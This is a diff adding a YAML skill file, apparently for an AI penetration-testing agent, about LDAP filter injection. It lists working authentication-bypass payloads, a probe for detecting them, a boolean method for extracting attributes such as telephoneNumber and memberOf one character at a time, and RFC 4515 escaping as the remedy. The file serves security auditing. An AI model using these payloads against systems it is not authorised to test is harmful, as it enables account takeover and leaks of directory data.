@@ -1,0 +1,64 @@
+schema_version: 1
+version: 3.0.0
+name: ldap-injection
+description: Senior Lightweight Directory Access Protocol (LDAP) and Active Directory filter injection — authentication bypass, boolean attribute exfiltration, and RFC 4515 escaping gaps.
+triggers:
+  - ldap
+  - ldap injection
+  - active directory filter
+  - ldap auth bypass
+  - rfc 4515
+  - directory search
+tools:
+  - curl
+knowledge: |
+  Audit directory services, enterprise logins, and search queries for LDAP filter injection with senior offensive rigor.
+
+  1. LDAP FILTER SYNTAX & INJECTION MECHANICS:
+     Applications frequently construct LDAP search filters via string concatenation:
+     - Typical Backend Filter:
+       `(&(uid={user_input})(userPassword={pass_input}))`
+     - Prefix Notation Operators:
+       `&` (logical AND), `|` (logical OR), `!` (logical NOT), `*` (wildcard).
+     - Filter Breakout Logic:
+       If `user_input` is not escaped per RFC 4515, an attacker can balance parentheses and append an always-true predicate, causing the query to succeed and return the directory entry regardless of the password.
+
+  2. AUTHENTICATION BYPASS PAYLOADS:
+     - Wildcard and Injected Clause:
+       `username: *)(uid=*))(|(uid=*`
+       Resulting Filter:
+       `(&(uid=*)(uid=*))(|(uid=*)(userPassword=x))`
+     - Password Filter Nullification:
+       `username: admin)(|(userPassword=*`
+       Resulting Filter:
+       `(&(uid=admin)(|(userPassword=*)(userPassword=x))`
+       Evaluates to true if the user `admin` exists and has any password set.
+     - ObjectClass OR Injection:
+       `username: *)(objectClass=*`
+
+  3. DETECTION & VERIFICATION SIGNALS:
+     - Two-Step Differential Probe:
+       1. Baseline: Submit clean invalid credentials (`clean_user` / `clean_pass`). Expect `HTTP 401 Unauthorized` or `403 Forbidden`.
+       2. Attack: Submit LDAP breakout payload in username field with arbitrary password.
+     - Positive Success Signals:
+       • Status code flips from 401/403 to `HTTP 200 OK` or `302 Found`.
+       • `Set-Cookie` header issues an authenticated session identifier (`session`, `sid`, `auth_token`).
+       • Response body contains user profile data or redirects to authenticated landing pages (`/dashboard`, `/account`).
+
+  4. BLIND ATTRIBUTE EXTRACTION (BOOLEAN INFERENCE):
+     When direct output is not returned, extract sensitive attributes character-by-character using wildcard matching:
+     - Probing Attribute Prefixes:
+       `username: admin)(telephoneNumber=1*` -> Negative response
+       `username: admin)(telephoneNumber=5*` -> Positive response (first digit is 5)
+       `username: admin)(telephoneNumber=55*` -> Repeat until full attribute value is recovered.
+     - Target Attributes: `mail`, `description`, `sAMAccountName`, `userPrincipalName`, `memberOf`.
+
+  5. REMEDIATION & SAFETY STANDARDS:
+     - Applications must use parameterized LDAP search frameworks or escape metacharacters per RFC 4515:
+       `*` -> `\2a`, `(` -> `\28`, `)` -> `\29`, `\` -> `\5c`, `NUL` -> `\00`.
+     - Maintain read-only non-destructive testing: never modify or lock Active Directory accounts during testing.
+references:
+  - persona:ldap-injection-v3
+provenance:
+  origin: builtin
+  source: persona/v0.1/skills/ldap-injection.yaml
